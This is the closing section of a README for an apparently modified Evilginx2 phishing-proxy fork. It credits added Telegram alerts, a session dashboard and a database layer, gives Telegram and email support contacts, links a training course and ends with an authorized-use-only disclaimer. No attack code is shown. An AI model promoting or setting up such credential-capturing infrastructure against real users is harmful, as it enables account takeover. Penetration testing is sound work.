                          NO │             │ YES
                            ▼             ▼
              ┌──────────────────┐  ┌──────────────────┐
              │ Send new message │  │ Edit existing    │
              │ via Telegram API │  │ message via      │
              │ Store message_id │  │ editMessageFile()│
              └──────────────────┘  └──────────────────┘
```

---

# 👏 Credits & Support

## Contributors

| Contribution | Author |
|---|---|
| **Telegram Notifications** (async queue, file attachments, auto-updating messages) | [@officialmonsterz](https://t.me/officialmonsterz) |
| **Web Dashboard** (HTML UI, REST API, CSV/JSON export, search, dark mode) | [@officialmonsterz](https://t.me/officialmonsterz) |
| **Database Layer** (BuntDB integration, session CRUD) | [@officialmonsterz](https://t.me/officialmonsterz) |
| **Docker Build** (multi-stage, Alpine, ~18MB) | [@officialmonsterz](https://t.me/officialmonsterz) |
| **Original Evilginx2/3** | Kuba Gretzky ([@mrgretzky](https://github.com/kgretzky)) — [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |

## Get Help

- **Telegram Support:** [t.me/officialmonsterz](https://t.me/officialmonsterz)
- **Email:** `shapads@tutamail.com`
- **GitHub Issues:** [github.com/officialmonsterz/evilginx2/issues](https://github.com/officialmonsterz/evilginx2/issues)
- **Documentation:** See other `.md` files in the repository

## Evilginx Training Course

> 🔥 _Already mastering Evilginx? Level up with the complete [Evilginx Training Course](https://shop.fluxxset.com/product/evilginx-training-course/)._

---

## ⚠️ Legal Disclaimer

This tool is for **authorized security testing only**. You must have **explicit written permission** before testing any system you do not own. Unauthorized use is illegal and unethical.

This deployment guide is provided for **educational purposes** and **legitimate security assessments** conducted by authorized professionals.

---

*Created with ❤️ by [@officialmonsterz](https://t.me/officialmonsterz) — Special thanks to the entire Evilginx community for their contributions and support.*
